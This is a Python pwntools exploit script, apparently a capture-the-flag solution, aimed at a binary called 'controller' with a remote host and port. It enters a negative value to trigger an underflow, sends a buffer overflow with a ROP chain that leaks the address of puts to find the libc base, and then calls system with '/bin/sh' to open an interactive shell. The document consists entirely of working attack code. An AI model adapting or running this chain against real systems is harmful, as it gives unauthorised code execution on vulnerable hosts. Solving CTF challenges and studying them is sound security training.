#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./controller')

if args.REMOTE:
	p = remote('188.166.172.13',30995)
	libc = ELF('./libc.so.6')
else:
	p = process(binary.path)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.sendlineafter('recources: ','0 -65338')
p.sendlineafter('> ','2')

pop_rdi = next(binary.search(asm('pop rdi; ret')))

payload  = 0x28 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.calculator)

p.sendlineafter('> ',payload)

p.recvuntil('ingored\n')
_ = p.recv(6)
puts = u64(_ + b'\0\0')
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

p.sendlineafter('recources: ','0 -65338')
p.sendlineafter('> ','2')

payload  = b''
payload += 0x28 * b'A'
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

p.sendlineafter('> ',payload)
p.recvuntil('ingored\n')
p.interactive()
